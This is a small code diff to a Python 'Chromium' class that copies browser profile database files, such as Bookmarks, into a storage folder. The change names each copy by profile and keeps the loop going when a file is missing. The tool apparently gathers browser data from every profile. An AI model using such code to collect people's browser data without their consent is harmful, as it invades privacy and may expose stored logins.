@@ -236,8 +236,8 @@ class Chromium:
                         continue
 
                     db_format = "" if item["name"] in ["Bookmarks"] else ".db"
-                    db_path = rf"{self.storage_path}\{self.browser_name} {item['name']}{db_format}"
                     profile_name = profile.replace("\\", "/").split("/")[-1]
+                    db_path = rf"{self.storage_path}\{self.browser_name} {profile_name} {item['name']}{db_format}"
 
                     if path.exists(item["path"]):
                         copyfile(item["path"], db_path)
@@ -247,7 +247,7 @@ class Chromium:
 
                     else:
                         if self.errors is True: print(f"[{self.browser_name}]: {item['error']}")
-                        return
+                        continue
 
                     if item["name"] in ["Bookmarks"]:
                         with open(db_path, "r", encoding="utf-8") as bookmarks:
